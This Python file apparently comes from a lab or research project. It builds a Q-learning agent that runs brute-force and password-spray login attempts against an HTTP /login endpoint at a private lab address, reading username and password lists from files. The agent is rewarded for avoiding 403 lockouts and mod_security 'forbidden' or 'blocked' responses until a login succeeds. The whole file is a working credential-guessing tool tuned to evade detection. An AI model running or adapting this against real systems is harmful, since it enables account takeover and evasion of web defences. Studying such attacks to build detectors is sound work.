import numpy as np
import random
import time
from itertools import cycle
from HTTP import HTTPQuery
import threading
import SharedMemLib

class CustomEnv:
    def __init__(self):
        self.query_count = 0
        self.PasswordSpray = False
        self.state = self.default_state()

        # # Load users and passwords from files
        # with open("../Data/100-usernames.txt", "r") as f:
        #     self.users = cycle([line.strip() for line in f])
        # with open("../Data/100-passwords.txt", "r") as f:
        #     self.passwords = cycle([line.strip() for line in f])

        #shorter list to make sure it actually does something
        self.users = []
        self.passwords = []

        #self.current_user = next(self.users)
        #self.current_password = next(self.passwords)
        
        #self.http_query = HTTPQuery(
        #    host="http://192.168.16.147:8081",
        #    default_headers={"Content-Type": "application/x-www-form-urlencoded"},
        #    post_query="username=${USER}&password=${PASS}",
        #    path="/login",
        #    use_post=True,
        #    use_json=False
        #)
        self.http_query = HTTPQuery(
            host="http://192.168.16.147:8082",
            path="/login",
            use_post=True,
            use_json=True
        )
        self.signal = threading.Event()
        self.lock = threading.Lock()
        self.indexUsrs = 0
        self.indexPass_map = {i: 0 for i in range(len(self.users))}
        self.total_pairs = len(self.users) * len(self.passwords)

        self.undetected_attempt_count = 0
        self.total_attempt_count = 0
        
        # Q-learning parameters

        self.q_table = np.zeros((100, 4))
        self.epsilon = 1.0
        self.alpha = 0.1
        self.gamma = 0.9
        self.time_penalty = 0
        self.lockout_prob = 0.05

    # Function to read user list from a file
    def read_user_list(self,file_path, delimiter=None, password_list=None):
        with open(file_path, 'r') as file:
            for line in file:
                line = line.strip()
                if delimiter and not password_list:
                    user, password = line.split(delimiter)
                    self.users.append(user)
                    self.passwords.append(password)
                else:
                    self.users.append(line)
        return self.users, self.passwords

    # Function to read password list from a file
    def read_password_list(self,file_path):

        with open(file_path, 'r') as file:
            for line in file:
                self.passwords.append(line.strip())
        return self.passwords

    def get_next_pair(self):
        
        with self.lock:
            while self.indexUsrs < len(self.users):
                    if(self.indexPass_map[self.indexUsrs] < len(self.passwords)):
                         break
                    self.indexUsrs += 1
                    if self.indexUsrs >= len(self.users):
                        self.indexUsrs = 0
            if(self.indexUsrs == len(self.users) or self.indexPass_map[self.indexUsrs] >= len(self.passwords)):
                return None, None
            if not self.PasswordSpray:
                item1 = self.users[self.indexUsrs]
                item2 = self.passwords[self.indexPass_map[self.indexUsrs]]
                self.indexPass_map[self.indexUsrs] += 1
                if self.indexPass_map[self.indexUsrs] >= len(self.passwords):
                    self.indexUsrs += 1
            else:
                item1 = self.users[self.indexUsrs]
                
                
                item2 = self.passwords[self.indexPass_map[self.indexUsrs]]

                if self.indexUsrs >= len(self.users):
                    self.indexUsrs = 0
                    self.indexPass_map[self.indexUsrs] += 1

            self.total_attempt_count += 1
            return item1, item2

    def default_state(self):
        return (self.query_count, self.PasswordSpray)

    def choose_action(self, state):
        if random.uniform(0, 1) < self.epsilon:
            action = random.randint(0, 3)
        else:
            action = np.argmax(self.q_table[self.state_to_index(state)])
        print(f"Choosing action {action} with epsilon {self.epsilon:.2f}")
        return action

    def adjust_epsilon(self):
        self.epsilon = max(0.01, self.epsilon * 0.995)

    def dynamic_timeout(self):
        success_rate = (
            self.undetected_attempt_count / self.total_attempt_count
            if self.total_attempt_count > 0
            else 0
        )
        if success_rate < 0.5:
            self.lockout_prob = min(self.lockout_prob * 1.1, 0.5)
            self.time_penalty = min(self.time_penalty + 1, 5)
        else:
            self.lockout_prob = max(self.lockout_prob * 0.9, 0.01)
            self.time_penalty = max(self.time_penalty - 1, 0)

        print(f"Lockout probability adjusted to {self.lockout_prob:.2f} and time penalty to {self.time_penalty} seconds")

    def step(self, action):
        reward = 0
        done = False

        self.dynamic_timeout()

        if action == 0:
            print("Action: Wait")
            time.sleep(self.time_penalty)
            reward -= 1
        elif action == 1:
            print("Action: Skip user")
            self.indexUsrs += 1
        elif action == 2:
            print("Action: Try next password")
            username, password = self.get_next_pair()
            if(username is None or password is None):
                done = True
                print("All username-password pairs exhausted.")
                return self.state, reward+50, done
            
            success, status_code, response_text = self.http_query.perform_query_verbose(
                username=username,
                password=password,
                search_string="Welcome"
            )
            reward += self.determine_reward_from_response(success, status_code, response_text)

            self.query_count += 1
            self.total_attempt_count += 1

            #if random.uniform(0, 1) < self.lockout_prob:
            #    status_code = 403

            if success:
                reward += 100
                done = True
                print("Login successful!")
            elif status_code == 403:
                reward -= 5
                print("Lockout detected (403).")
                time.sleep(self.time_penalty)
            else:
                reward += 1
                self.undetected_attempt_count += 1
                print(f"Attempt failed without lockout. {self.undetected_attempt_count} undetected attempts.")

        elif action == 3:
            print("Action: Toggle brute force and password spray")
            self.change_traversal()
        #todo: read from shared memory, if there's a message, then reward -= 15
        self.read_write_sharedMem()

        state_idx = self.state_to_index(self.state)
        next_state_idx = self.state_to_index(self.default_state())
        best_next_action = np.argmax(self.q_table[next_state_idx])
        self.q_table[state_idx, action] += self.alpha * (
            reward + self.gamma * self.q_table[next_state_idx, best_next_action]
            - self.q_table[state_idx, action]
        )

        self.adjust_epsilon()

        self.state = (self.query_count, self.PasswordSpray)
        print(f"New state: {self.state}, Reward: {reward}, Done: {done}")
        return self.state, reward, done
    
    def change_traversal(self):
        with self.lock:
            self.PasswordSpray = not self.PasswordSpray
            
    def state_to_index(self, state):
        index = state[0] * 2 + (0 if state[1] == False else 1)
        return index if index < 100 else 99

    def determine_reward_from_response(self, success, status_code, response_text):
        reward = 0
        #Default mod_security resopnse
        if "forbidden" in response_text.lower():
            reward -= 15
        elif "blocked" in response_text.lower():
            reward -= 10

        if success:
            reward += 1
        return reward

    def read_write_sharedMem(self):
        message = SharedMemLib.read_write_sharedMem(SharedMemLib.Mode.READ)
        reward = 0
        if message:
            reward -= 15
        return reward

    def reset(self):
        self.query_count = 0
        self.PasswordSpray = False
        self.state = self.default_state()
        
        self.indexUsrs = 0
        self.indexPass_map = {i: 0 for i in range(len(self.users))}
        self.PasswordSpray = False
        self.total_pairs = len(self.users) * len(self.passwords)

        self.undetected_attempt_count = 0
        self.total_attempt_count = 0
        print("Environment reset.")

        # Sleep for default lockout time + 1 second at the beginning of each new episode
        time.sleep(self.time_penalty + 1)

        return self.state

if __name__ == "__main__":
    env = CustomEnv()
    num_episodes = 1000
    max_steps_per_episode = 100
    total_rewards = []
    user_file = "../Data/usernames.txt"
    password_file = "../Data/passwords.txt"
    delimiter = None
    users, passwords = env.read_user_list(user_file, delimiter)
    if not passwords:
        passwords = env.read_password_list(password_file)

    for episode in range(num_episodes):
        state = env.reset()
        episode_reward = 0

        print(f"=== Starting Episode {episode + 1} ===")

        for step in range(max_steps_per_episode):
            # Choose action based on the current state
            action = env.choose_action(state)
            
            # Perform the chosen action and observe the results
            next_state, reward, done = env.step(action)
            episode_reward += reward

            # Check if the episode is done (i.e., successful login or lockout)
            if done:
                print(f"Episode finished after {step + 1} steps with total reward: {episode_reward}")
                exit() #terminate early to see if we actually successfuly detect login
                break

            # Update state
            state = next_state

        total_rewards.append(episode_reward)
        print(f"Episode {episode + 1} reward: {episode_reward}")

    # Post-training summary
    print("\n=== Training Complete ===")
    print(f"Average reward per episode: {np.mean(total_rewards):.2f}")
    print(f"Highest reward in an episode: {max(total_rewards)}")
    print(f"Lowest reward in an episode: {min(total_rewards)}")
